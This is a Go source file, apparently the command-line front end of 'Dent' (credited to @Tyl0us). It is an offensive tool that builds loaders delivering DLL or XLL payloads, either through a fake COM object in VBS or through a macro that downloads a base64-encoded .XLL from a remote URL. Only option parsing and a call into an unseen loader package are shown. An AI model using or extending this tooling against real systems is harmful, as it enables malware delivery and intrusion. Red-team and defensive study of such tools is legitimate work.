package main

import (
	"Dent/Loader"
	"flag"
	"fmt"
	"log"
)

type FlagOptions struct {
	outFile   string
	URL       string
	Name      string
	COM       string
	filename  string
	inputFile string
	Show      bool
}

func options() *FlagOptions {
	outFile := flag.String("O", "output.txt", "Name of output file.")
	URL := flag.String("U", "", "The base URL where the base64 encoded XLL payload is hosted")
	Name := flag.String("N", "", "Name of the XLL or DLL payload when its written to disk.")
	COM := flag.String("C", "", "Name of the COM object.")
	filename := flag.String("F", "", "Name of the file hosted on the URL.")
	inputFile := flag.String("I", "", "")
	Show := flag.Bool("show", false, "Display the script in the terminal.")
	flag.Parse()
	return &FlagOptions{outFile: *outFile, URL: *URL, Name: *Name, COM: *COM, filename: *filename, inputFile: *inputFile, Show: *Show}
}

func main() {
	fmt.Println(` 
________                 __   
\______ \   ____   _____/  |_ 
 |    |  \_/ __ \ /    \   __\
 |    |   \  ___/|   |  \  |  
/_______  /\___  >___|  /__|  
	\/     \/     \/      
		(@Tyl0us)

"Call someone a hero long enough, and they'll believe it. They'll become it. 
They have no choice. Let them call you a monster, and you become a monster."

`)
	opt := options()

	if opt.inputFile == "" && opt.URL == "" {
		log.Fatal("Error: Please provide a path to the dll based payload or URL the encoded payload is going be hosted on.")
	}
	if opt.inputFile != "" && opt.URL != "" {
		log.Fatal("Error: Please choose either -I or -URL but not both.")
	}
	if opt.URL != "" && opt.COM != "" {
		log.Fatal("Error: Can't use the -I with the -U option.")
	}
	if opt.URL != "" && opt.filename == "" {
		log.Fatal("Error: Can't use the -U without the -F option.")
	}
	if opt.Name == "" {
		log.Fatal("Error: Please provide the name of the playload")
	}

	var mode string
	var src []string
	if opt.URL == "" {
		mode = "vbs"
		fmt.Println("[*] Fake COM payload selected")
	} else {
		mode = "macro"
		fmt.Println("[*] Remote .XLL payload selected")
	}
	Loader.CompileLoader(mode, opt.outFile, src, opt.Name, opt.inputFile, opt.URL, opt.COM, opt.filename, opt.Show)
}
